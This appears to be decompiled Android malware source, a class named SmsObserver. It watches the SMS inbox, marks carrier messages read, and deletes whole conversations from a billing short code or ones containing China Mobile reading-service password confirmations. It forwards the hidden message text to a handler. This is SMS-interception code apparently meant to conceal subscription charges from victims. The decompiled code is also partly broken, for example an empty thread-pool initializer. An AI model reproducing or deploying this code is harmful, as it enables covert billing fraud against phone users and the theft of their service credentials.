package com.fdsds;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

public class SmsObserver
  extends ContentObserver
{
  private static ExecutorService cachedThreadPool = ;
  private String[] arrays = { "[中国移动和阅读]密码设置成功", "新密码为：abcd1234", "登录wap.cmread.com享受随身阅读乐趣", "和阅读", "新密码" };
  private Context context;
  private Handler handler;
  AtomicLong time = new AtomicLong(0L);
  
  public SmsObserver(Context paramContext, Handler paramHandler)
  {
    super(paramHandler);
    this.context = paramContext;
    this.handler = paramHandler;
  }
  
  private void checkKey()
  {
    Cursor localCursor = this.context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[] { "_id", "body", "read", "thread_id", "address" }, " address like ? or read=?", new String[] { "%10086%", "0" }, "date desc");
    Object localObject;
    String str;
    int i;
    if ((localCursor != null) && (localCursor.getCount() > 0))
    {
      localCursor.moveToFirst();
      localObject = new ContentValues();
      ((ContentValues)localObject).put("read", "1");
      this.context.getContentResolver().update(Uri.parse("content://sms/inbox"), (ContentValues)localObject, " _id=?", new String[] { localCursor.getInt(0) });
      localObject = localCursor.getString(4);
      str = localCursor.getString(1);
      i = 0;
    }
    for (;;)
    {
      if (i >= this.arrays.length)
      {
        if (!localCursor.isClosed()) {
          localCursor.close();
        }
        return;
      }
      if ((((String)localObject).equals("106580808")) || (str.contains(this.arrays[i])))
      {
        int j = this.context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + localCursor.getLong(3)), null, null);
        Message localMessage = this.handler.obtainMessage();
        localMessage.obj = ("key " + j + " " + str);
        this.handler.sendMessage(localMessage);
      }
      i += 1;
    }
  }
  
  public void onChange(boolean paramBoolean)
  {
    if (paramBoolean) {
      return;
    }
    cachedThreadPool.execute(new SmsObserver.1(this));
  }
}
